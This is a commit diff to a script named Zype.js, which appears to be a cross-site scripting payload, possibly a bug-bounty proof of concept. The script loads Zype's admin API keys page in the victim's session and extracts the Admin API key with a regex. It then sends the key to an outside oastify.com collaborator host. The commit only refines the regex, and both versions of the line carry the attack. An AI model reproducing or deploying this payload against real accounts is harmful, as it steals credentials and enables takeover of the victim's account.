dc41a3db65298d5cd63c908f3f09eeae821e0005
tomoncrss <tonymyson89823@gmail.com>
2025-10-08 07:43:03 +0330

    Update Zype.js

--- Zype.js
+++ Zype.js
@@ -1,4 +1,4 @@
-fetch("https://admin.zype.com/api_keys").then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin<\/td>\s*<td>(\w+)<\/td>/);if (apiKeyMatch) {
+fetch("https://admin.zype.com/api_keys").then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin<\/td>[\s\S]*?<span[^>]*class="api-key-revealed"[^>]*>([\w-]+)<\/span>/);if (apiKeyMatch) {
       const apiKey = apiKeyMatch[1];
       return fetch("https://pslqfy5adtewu0peut1guau3jupldb10.oastify.com?x=" + apiKey);
     } else {
